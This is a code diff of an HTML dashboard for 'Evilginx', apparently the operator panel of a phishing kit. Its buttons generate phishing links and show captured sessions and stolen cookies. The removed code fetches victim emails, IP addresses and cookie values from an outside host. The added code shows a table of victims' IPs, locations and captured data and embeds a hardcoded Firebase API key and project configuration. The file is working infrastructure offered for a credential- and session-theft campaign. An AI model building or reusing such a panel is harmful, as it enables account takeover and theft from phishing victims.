@@ -3,86 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - Evilginx</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #121212;
-            color: white;
-        }
-        .menu {
-            display: flex;
-            justify-content: space-around;
-            background: #6a11cb;
-            padding: 10px;
-        }
-        .menu button {
-            background: transparent;
-            border: none;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .content {
-            padding: 20px;
-        }
-    </style>
+    <title>Dashboard | Evilginx</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+    <div class="dashboard-container">
+        <h1>Welcome to Evilginx Dashboard</h1>
+        <nav>
+            <button id="generate-link">Generate Link</button>
+            <button id="captured-sessions">Captured Sessions</button>
+            <button id="cookies">Cookies</button>
+            <button id="logout-btn">Logout</button>
+        </nav>
 
-<div class="menu">
-    <button onclick="generateLink()">Generate Link</button>
-    <button onclick="showSessions()">Captured Sessions</button>
-    <button onclick="showCookies()">Cookies</button>
-    <button onclick="logout()">Logout</button>
-</div>
+        <div id="output"></div>
 
-<div class="content" id="content-area">
-    <h2>Welcome to the Dashboard</h2>
-</div>
+        <table id="data-table">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>IP Address</th>
+                    <th>Location</th>
+                    <th>Timestamp</th>
+                    <th>Captured Data</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
 
-<script>
-    function generateLink() {
-        fetch("http://tecan.com.co/api/generate", { method: "POST" })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById("content-area").innerHTML = "<p>Generated Link: " + data.link + "</p>";
-            })
-            .catch(error => console.error("Error:", error));
-    }
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>
 
-    function showSessions() {
-        fetch("http://tecan.com.co/api/sessions")
-            .then(response => response.json())
-            .then(data => {
-                let content = "<h2>Captured Sessions</h2><ul>";
-                data.sessions.forEach(session => {
-                    content += `<li>${session.email} - ${session.ip}</li>`;
-                });
-                content += "</ul>";
-                document.getElementById("content-area").innerHTML = content;
-            })
-            .catch(error => console.error("Error:", error));
-    }
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
+            authDomain: "panel-auth-134b7.firebaseapp.com",
+            projectId: "panel-auth-134b7",
+            storageBucket: "panel-auth-134b7.firebasestorage.app",
+            messagingSenderId: "892746068340",
+            appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
+        };
 
-    function showCookies() {
-        fetch("http://tecan.com.co/api/cookies")
-            .then(response => response.json())
-            .then(data => {
-                let content = "<h2>Captured Cookies</h2><ul>";
-                data.cookies.forEach(cookie => {
-                    content += `<li>${cookie.name}: ${cookie.value}</li>`;
-                });
-                content += "</ul>";
-                document.getElementById("content-area").innerHTML = content;
-            })
-            .catch(error => console.error("Error:", error));
-    }
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+    </script>
 
-    function logout() {
-        window.location.href = "index.html";
-    }
-</script>
-
+    <script src="script.js"></script>
 </body>
 </html>
